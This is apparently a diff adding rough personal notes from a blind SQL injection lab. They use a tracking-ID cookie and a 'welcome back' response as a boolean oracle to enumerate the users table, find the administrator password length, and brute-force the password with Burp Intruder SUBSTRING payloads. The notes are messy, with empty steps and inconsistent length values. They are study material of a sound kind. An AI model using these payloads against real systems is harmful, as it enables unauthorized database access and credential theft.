@@ -1,0 +1,75 @@
+Discovering Blind SQL Injections
+
+gussing passwd length try try >>welcomeback seccion
+
+
+>>>           '
+request cookies:
+/path   example: {tracking id 12345feqfr111' anD 2=1--}
+
+' anD 2=1--
+ 
+
+' anD 2=2--
+
+Enumerating Table & Column Names:
+
+
+1. we have a table that is called x.
+
+>>>  ' anD (SELECT 'a' FROM users LIMIT 1)='a'--         worked
+
+
+2. we have a column called y in the x table?
+
+>>>   ' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--        worked
+
+
+3. we have a value in table x.
+
+>>> 
+1) ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
+2) ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a'--
+3) ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--         not welcomeback         not  worked
+4) ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--         visible welcomeback          worked
+
+answer:
+5) ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--           ###  >>  understand password length 20  <<  ###
+
+----------------------------------
+
+
+passwd bruteforce attack in intruder:
+
+
+##  Recovering Administrator Password With Burp Intruder ##
+
+
+1) the first character of the password is a
+
+>>>   ' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)=10)=§a§-- 
+
+
+
+2) the first character of the password is b
+
+
+>>>   
+
+
+3) the first character of the password is c
+
+
+>>>  §
+
+
+//// Cookie: TrackingId=XEuRrYqJJtaigXES ###>>>>>   ' anD (SELECT SUBSTRING(password,§1,1§) FROM users WHERE username='administrator' AND LENGTH(password)=10)='§a§'--;    <<<<<<< # ##session=VQZCTCPrvUATxLgnwHYvPZO9IrLLhyQc ///   
+
+
+#### Using the Cluster-Bomb Attack to Recover Passwords ####
+
+
+
+
+
+
